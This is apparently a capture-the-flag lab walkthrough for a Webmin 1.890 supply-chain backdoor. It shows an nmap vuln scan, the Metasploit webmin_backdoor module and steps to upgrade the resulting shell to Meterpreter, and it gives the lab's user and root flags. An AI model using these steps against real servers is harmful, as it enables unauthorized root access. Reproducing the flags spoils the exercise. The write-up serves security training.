# AttackerKB



## Discovering the Lay of the Land
```
root@ip-10-10-190-100:~# sudo nmap -sS -A -script=vuln 10.10.28.69

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-05 01:53 GMT
Nmap scan report for ip-10-10-28-69.eu-west-1.compute.internal (10.10.28.69)
Host is up (0.025s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-litespeed-sourcecode-download: 
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)
| /index.php source code:
| <h1>Error - Document follows</h1>
|_<p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-28-69.eu-west-1.compute.internal:10000/'>https://ip-10-10-28-69.eu-west-1.compute.internal:10000/</a> instead.<br></p>
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2010-0738: 
|_  /jmx-console/: Authentication was not required
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
MAC Address: 02:4E:81:22:40:9D (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/5%OT=22%CT=1%CU=40970%PV=Y%DS=1%DC=D%G=Y%M=024E81%TM
OS:=61D4FA52%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)
OS:OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=
OS:M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6
OS:=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT      ADDRESS
1   24.62 ms ip-10-10-28-69.eu-west-1.compute.internal (10.10.28.69)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.04 seconds
```

- Webmin is a non-traditional service running on port 10000 and is running version `MiniServ 1.890`

## Learning To Fly
- [AttackerKB](https://attackerkb.com/) is similar to Exploit-DB but has a higher degree of information about vulnerabilities and exploits
- Search for `Webmin` in the search bar
- Find [this](https://attackerkb.com/topics/hxx3zmiCkR/webmin-password-change-cgi-command-injection?referrer=search) article and find that Webmin 1.890 is immediately vunerable to this exploit, and it's a supply chain attacker
- [This](https://www.webmin.com/exploit.html) explains that the vunerability wasn't an accident; the Webmin dev build server was exploited and a vulnerability was purposely added
- A [metasploit module](https://github.com/rapid7/metasploit-framework/pull/12219) was added for the backdoor

## Blasting Away
- Start metasploit, search for webmin backdoor module with `search Webmin`, and we find the module `exploit/linux/http/webmin_backdoor`
```
msf5 > search Webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


Interact with a module by name or index, for example use 5 or use exploit/unix/webapp/webmin_upload_exec
```

- `use exploit/linux/http/webmin_backdoor` and use `options` to see the required options. Then set the options and `exploit`
- This will run the exploit. It may seem like nothing is happening, but it's working. Now use `background` to send the current session to the background. Then use `use post/multi/manage/shell_to_meterpreter` and `set SESSION <session that webmin module is running in>` to start meterpreter in that session. Run `exploit` again and meterpreter will be started in a new session. Now use `sessions -i <session that meterpreter is running in>` to interact with meterpreter, and now we have access to Webmin's server
- Now let's navigate to `/home/dark` and `cat user.txt` to find `THM{SUPPLY_CHAIN_COMPROMISE}`. Then use `cat /root/root.txt` to get `THM{UPDATE_YOUR_INSTALL}`
